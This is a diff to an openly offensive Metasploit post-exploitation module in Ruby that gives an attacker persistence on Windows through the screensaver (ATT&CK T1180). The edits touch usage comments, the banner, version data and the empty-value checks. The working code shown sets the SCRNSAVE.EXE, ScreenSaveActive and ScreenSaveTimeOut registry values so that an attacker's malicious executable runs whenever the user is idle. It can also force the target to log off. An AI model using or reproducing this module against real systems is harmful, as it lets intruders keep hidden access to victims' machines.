@@ -35,6 +35,14 @@
 # Manually Path Search: root@kali:~# locate modules/post/windows/escalate
 #
 #
+# [ RELOAD METASPLOIT DB ]
+# In some linux distributions postgresql needs to be started and
+# metasploit database deleted/rebuild to be abble to load module.
+# 1 - service postgresql start
+# 2 - msfdb reinit (optional)
+# 3 - msfconsole -x 'reload_all'
+#
+#
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
 # msf exploit(handler) > reload_all
@@ -44,14 +52,6 @@
 # msf post(SCRNSAVE_T1180_persistence) > show advanced options
 # msf post(SCRNSAVE_T1180_persistence) > set [option(s)]
 # msf post(SCRNSAVE_T1180_persistence) > exploit
-#
-#
-# [ HINT ]
-# In some linux distributions postgresql needs to be started and
-# metasploit database deleted/rebuild to be abble to load module.
-# 1 - service postgresql start
-# 2 - msfdb reinit (optional)
-# 3 - msfconsole -x 'reload_all'
 ##
 
 
@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Post
 #
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'SCRNSAVE.EXE T1180 (User-land Persistence)',
+                        'Name'          => 'SCRNSAVE T1180 (User-land Persistence)',
                         'Description'   => %q{
                                         To achieve persistence the attacker can modify 'SCRNSAVE.EXE' value in the registry and change its data to point to any malicious file, next the attacker has to enable the screensaver on the endpoint and change screensaver timeout by modifying the registry data for 'ScreenSaveActive' and 'ScreenSaveTimeOut'. Once this is completed, anytime the user leaves their desktop unattended for the specified amount of time, the screensaver function automatically kicks in and executes the attackers malicious PE/Appl.
                         },
@@ -95,8 +95,8 @@ class MetasploitModule < Msf::Post
                                         'Special Thanks: shanty damayanti',
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
-                        'DisclosureDate' => 'fev 9 2019',
+                        'Version'        => '$Revision: 1.2',
+                        'DisclosureDate' => 'Fev 11 2019',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # Thats no need for privilege escalation.
@@ -157,10 +157,10 @@ def run
   #
   # MODULE BANNER
   #
-  print_line("    +------------------------------------------+")
-  print_line("    |   SCRNSAVE.EXE (User-Land Persistence)   |")
-  print_line("    |       Author : r00t-3xp10it (SSA)        |")
-  print_line("    +------------------------------------------+")
+  print_line("    +--------------------------------------------+")
+  print_line("    |    SCRNSAVE.EXE (User-Land Persistence)    |")
+  print_line("    |        Author : r00t-3xp10it (SSA)         |")
+  print_line("    +--------------------------------------------+")
   print_line("")
   print_line("    Running on session  : #{datastore['SESSION']}")
   print_line("    Computer            : #{sysnfo['Computer']}")
@@ -194,22 +194,16 @@ def run
    print_warning("SCRNSAVE.EXE mitre ATT&CK T1180 (user-land persistence)")
     Rex::sleep(1.5)
   end
-
-
-    #
-    # check for proper operative system (windows-not-wine)
-    #
-    if not oscheck == "Windows_NT"
-      print_error("[ ABORT ]: This module only works againts windows systems.")
-      return nil
-    end
-    #
-    # check for proper operative system version
-    #
-    if not sysinfo['OS'] =~ /Windows (2008|xp|vista|7|9|10)/
-      print_error("[ ABORT ]: #{sysnfo['OS']} versions are not affected by mitre ATT&CK T1180.")
-      return nil
-    end
+  # check for proper operative system (windows-not-wine)
+  if not oscheck == "Windows_NT"
+    print_error("[ ABORT ]: This module only works againts windows systems.")
+    return nil
+  end
+  # check for proper operative system version
+  if not sysinfo['OS'] =~ /Windows (2008|xp|vista|7|9|10)/
+    print_error("[ ABORT ]: #{sysnfo['OS']} versions are not affected by mitre ATT&CK T1180.")
+    return nil
+  end
 
 
     #
@@ -219,54 +213,61 @@ def run
     Rex::sleep(1.0)
     if registry_getvaldata("#{hive_key}","SCRNSAVE.EXE")
       print_good("Target system appears to be vulnerable to the exploit code.")
-      Rex::sleep(1.0)
+      Rex::sleep(0.5)
     else
       # registry hive key not found, aborting module execution ..
       print_error("NOT FOUND: #{hive_key} SCRNSAVE.EXE")
       print_warning("Target system does not appear to be vulnerable to the exploit code.")
-      Rex::sleep(1.0)
+      Rex::sleep(1.5)
       return nil
     end
 
 
     #
-    # Store default reg values to build revert.rc later.
+    # Store default reg values (target system) to build revert.rc later.
     #
     print_status("Store default registry values to build revert.rc script.")
     Rex::sleep(0.5)
     print_status("Retriving default SCRNSAVE.EXE registry value data.")
     scrnsave_data = registry_getvaldata('HKCU\Control Panel\Desktop','SCRNSAVE.EXE')
     Rex::sleep(1.0)
+      # make sure the retrieve values are not empty strings
+      if scrnsave_data.nil? || scrnsave_data == '' || scrnsave_data == ' '
+        print_warning("Reg value contains empty data, set module default data.")
+        scrnsave_data = 'C:\\\Windows\\\System32\\\Mystify.src' # windows 10 default data
+        Rex::sleep(0.5)
+      end
     print_status("Retriving default ScreenSaveTimeOut registry value data.")
     scrnsave_timeout = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveTimeOut')
     Rex::sleep(1.0)
+      # make sure the retrieve values are not empty strings
+      if scrnsave_timeout.nil? || scrnsave_timeout == '' || scrnsave_timeout == ' '
+        print_warning("Reg value contains empty data, set module default data.")
+        scrnsave_timeout = "180" # 180 sec == 3 minuts
+        Rex::sleep(0.5)
+      end
     print_status("Retriving default ScreenSaverIsSecure registry value data.")
     scrnsave_issecure = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
     Rex::sleep(1.0)
+      # make sure the retrieve values are not empty strings
+      if scrnsave_issecure.nil? || scrnsave_issecure == '' || scrnsave_issecure == ' '
+        print_warning("Reg value contains empty data, set module default data.")
+        scrnsave_issecure = "0" # 0 == screensave secure off
+        Rex::sleep(0.5)
+      end
     print_status("Retriving default ScreenSaveActive registry value data.")
     scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
     Rex::sleep(1.0)
+      # make sure the retrieve values are not empty strings
+      if scrnsave_active.nil? || scrnsave_active == '' || scrnsave_active == ' '
+        print_warning("Reg value contains empty data, set module default data.")
+        scrnsave_active = "1" # 1 == screensave active on
+        Rex::sleep(0.5)
+      end
 
 
     #
-    # make sure retrieve values are not empty strings
-    #
-    if scrnsave_data.nil? || scrnsave_data == '' || scrnsave_data == ' '
-      scrnsave_data = 'C:\\\Windows\\\System32\\\Mystify.src'
-    end
-    if scrnsave_timeout.nil? || scrnsave_timeout == '' || scrnsave_timeout == ' '
-      scrnsave_timeout = "180"
-    end
-    if scrnsave_issecure.nil? || scrnsave_issecure == '' || scrnsave_issecure == ' '
-      scrnsave_issecure = "0"
-    end
-    if scrnsave_active.nil? || scrnsave_active == '' || scrnsave_active == ' '
-      scrnsave_active = "1"
-    end
-
-
-    #
-    # create revert resource file [local PC]
+    # create revert resource file (local PC)
     #
     rand = Rex::Text.rand_text_alpha(5)
     print_good("Writing revert_#{rand}.rc resource file (local).")
@@ -275,7 +276,8 @@ def run
       File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
         f.write("###\n")
         f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
-        f.write("## Computer: #{sysnfo['Computer']} | Payload: #{app_path}\n")
+        f.write("## Computer: #{sysnfo['Computer']} | OS: #{sysnfo['OS']}\n")
+        f.write("## Payload: #{app_path} | Timeout: #{time_out}\n")
         f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
         f.write("###\n")
         f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d #{scrnsave_active}\n")
@@ -289,14 +291,16 @@ def run
       #
       # check if PE/appl exists in remote system (APPL_PATH)
       #
-      print_status("checking for #{app_path} presence.")
+      print_status("checking for #{app_path} in #{sysnfo['Computer']}")
+      Rex::sleep(1.0)
       if session.fs.file.exist?(app_path)
         print_good("Remote PE/Application found on target system.")
+        Rex::sleep(0.5)
       else
         print_error("NOT FOUND: #{app_path}")
         print_warning("Deploy your [payload] before using this module.")
         print_warning("OR point to one existing application absoluct path.")
-        Rex::sleep(1.0)
+        Rex::sleep(1.5)
         return nil
       end
 
@@ -336,18 +340,19 @@ def run
               print_error("Error Running Command: #{e.class} #{e}")
             end
          end
-         print_line("")
 
 
        #
        # exploit finished (print info onscreen)
        #
+       print_line("")
        Rex::sleep(1.0)
-       print_line("---------------------------------------------------")
+       print_line("-----------------------------------------------------")
        print_line("Malicious PE/App : #{app_path}")
        print_line("Trigger exploit  : every #{time_out} sec (if inactive)")
        print_line("Revert script    : resource #{loot_folder}/revert_#{rand}.rc")
-       print_line("---------------------------------------------------")
+       print_line("-----------------------------------------------------")
+       print_warning("Target system needs to logoff for changes take effect.")
        Rex::sleep(1.5)
 
 
@@ -355,7 +360,7 @@ def run
      # force target system logoff to refresh registry?
      #
      if datastore['LOG_OFF'] == true
-       print_warning("LogOff #{sysnfo['Computer']} to force registry refresh.")
+       print_warning("Trying to LogOff #{sysnfo['Computer']} to force registry refresh.")
        Rex::sleep(1.5)
        cmd_exec("shutdown /h /f")
      end
